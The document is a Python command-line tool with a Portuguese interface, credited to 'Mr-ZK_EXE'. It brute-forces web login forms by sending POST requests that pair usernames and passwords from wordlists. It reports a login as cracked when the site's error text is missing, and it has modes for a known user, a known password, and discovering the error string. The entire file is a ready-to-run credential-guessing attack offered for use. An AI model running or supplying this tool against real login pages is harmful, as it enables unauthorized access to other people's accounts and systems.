#encoding: utf-8
import requests, itertools, climage, time, os

try:
	def userpass():
		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser ou Email WordList:\033[1;32m users.txt\n \033[1;33mSenhas Wordlist:\033[1;32m pass.txt\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")

		url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
		userdata = input('\033[1;32musuario data: \033[1;31m')
		passdata = input('\033[1;32msenha data: \033[1;31m')
		user = input('\033[1;32mUser ou Email WordList: \033[1;31m')
		pw = input('\033[1;32mSenhas Wordlist: \033[1;31m')
	 
		diruser = 'WL-user/' + user 
		dirpass = 'WL-pass/' + pw
		file_pw = open(dirpass, 'r', encoding='latin-1')
		file_user = open(diruser, 'r', encoding='latin-1')

		error = input('\033[1;32mQuando da Error: \033[1;31m')
		for uss, pws in itertools.product(file_user.readlines(), file_pw.readlines()):
			
			uss = uss.rstrip('\n')
			pws = pws.rstrip('\n')
			inf = {userdata : uss, passdata : pws}
			rs = requests.post(url, data=inf)
			
			if error in str(rs.text):
				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pws))
			else:
				print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pws))
				break
	def passs():
		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser:\033[1;32m joaozinho\n \033[1;33mSenhas Wordlist:\033[1;32m pass.txt\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")

		url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
		userdata = input('\033[1;32musuario data: \033[1;31m')
		passdata = input('\033[1;32msenha data: \033[1;31m')
		user = input('\033[1;32mUser: \033[1;31m')
		pw = input('\033[1;32mSenhas Wordlist: \033[1;31m')
	  
		dirpass = 'WL-pass/' + pw
		file_pw = open(dirpass, 'r', encoding='latin-1')
		

		error = input('\033[1;32mQuando da Error: \033[1;31m')
		for pws in file_pw.readlines():
			
			pws = pws.rstrip('\n')
			inf = {userdata : user, passdata : pws}
			rs = requests.post(url, data=inf)
			
			if error in str(rs.text):
				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(user, pws))
			else:
				print("\033[1;92mUser: {} senha: {} Quebro :)".format(user, pws))
				break
	def usu():
		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser ou Email WordList:\033[1;32m users.txt\n \033[1;33mSenha:\033[1;32m senha\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")

		url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
		userdata = input('\033[1;32musuario data: \033[1;31m')
		passdata = input('\033[1;32msenha data: \033[1;31m')
		user = input('\033[1;32mUser ou Email WordList: \033[1;31m')
		pw = input('\033[1;32mSenhas: \033[1;31m')
	 
		diruser = 'WL-user/' + user 
		file_user = open(diruser, 'r', encoding='latin-1')

		error = input('\033[1;32mQuando da Error: \033[1;31m')
		for uss in file_user.readlines():
			
			uss = uss.rstrip('\n')
			inf = {userdata : uss, passdata : pw}
			rs = requests.post(url, data=inf)
			
			if error in str(rs.text):
				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pw))
			else:
				print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pw))
				break

	def error():
		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n")

		url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
		userdata = input('\033[1;32musuario data: \033[1;31m')
		passdata = input('\033[1;32msenha data: \033[1;31m')
		inf = {userdata : 'jbxzjcbdsjbcjdsbcjdbsbcjsdbcbsdjcb', passdata : 'jbxzjcbdsjbcjdsbcjdbsbcjsdbcbsdjcb'}
		rs = requests.post(url, data=inf)

		print(rs.text)
		init()
	def init():
		print(climage.convert('tatu.png', is_unicode=True, width=40), '\033[1;31mv4.0\n')
		print('\033[1;32mscript Feito por \033[1;31mMr-ZK_EXE\n')
		print('\033[1;32mOpcões\n\n\033[1;33mdigite\n1 para pegar user e senha\n2 para quebrar senha se ja sabe o usuario\n3 para quebrar usuario se ja sabe o senha\n4 pegar o erro\n')
		
		ops = int(input('Numero: \033[1;31m'))
		if(ops == 1):
			print('usuario e senha')
			userpass()
		elif(ops == 2):
			passs()
		elif(ops == 3):
			usu()
		elif(ops == 4):
			error()
		else:
			print('Numero invalido')
			time.sleep(2)
			os.system('cls' if os.name == 'nt' else 'clear')
			init()
	init()
except KeyboardInterrupt:
	print('\033[1;31m \nVoce me fecho babaca :(')
except Exception as e:
	print('\033[1;31m \nError')
